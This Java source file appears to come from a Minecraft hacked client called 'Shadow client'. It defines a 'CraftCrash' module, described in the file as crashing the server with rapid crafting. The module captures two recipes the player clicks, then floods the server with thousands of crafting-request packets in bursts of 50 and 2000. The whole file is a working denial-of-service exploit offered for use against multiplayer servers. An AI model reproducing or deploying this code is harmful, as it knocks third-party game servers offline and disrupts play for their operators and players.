/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.gui.screen.ingame.CraftingScreen;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventListener;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;

public class CraftCrash extends Module {

    int ticks;
    boolean isListening = false;
    Recipe<?> stick = null;
    Recipe<?> buton = null;
    int superticks;


    public CraftCrash() {
        super("CraftCrash", "Crash the server with rapid crafting", ModuleType.CRASH);
        Events.registerEventHandlerClass(this);
    }

    @EventListener(type = EventType.PACKET_SEND)
    public void onPacketSend(PacketEvent event) {
        if (!this.isEnabled()) return;
        if (event.getPacket() instanceof CraftRequestC2SPacket packet) {
            if (isListening) {
                if (stick == null) {
                    stick = client.player.world.getRecipeManager().get(packet.getRecipe()).orElseThrow();
                    Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Selected first recipe");
                } else {
                    buton = client.player.world.getRecipeManager().get(packet.getRecipe()).orElseThrow();
                    Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Selected second recipe");
                    Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Starting the crash!");
                    isListening = false;
                }
            }
        }
    }

    @Override
    public void tick() {
        if (client.currentScreen instanceof CraftingScreen && !isListening) {
            ticks++;
            int sync = client.player.currentScreenHandler.syncId;
            if (ticks % 15 == 0) {
                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Disabling stream...");
                for (int i = 0; i < 50; i++) {
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                }
            }
            if (ticks % 75 == 0) {
                Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Sent Payload!");
                for (int i = 0; i < 2000; i++) {
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                }
                this.setEnabled(false);
            }
        }
    }

    @Override
    public void enable() {
        this.isListening = true;
        stick = null;
        buton = null;
        Notification.create(1000, "CraftCrash", Notification.Type.INFO, "Click two crafting recipies");
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
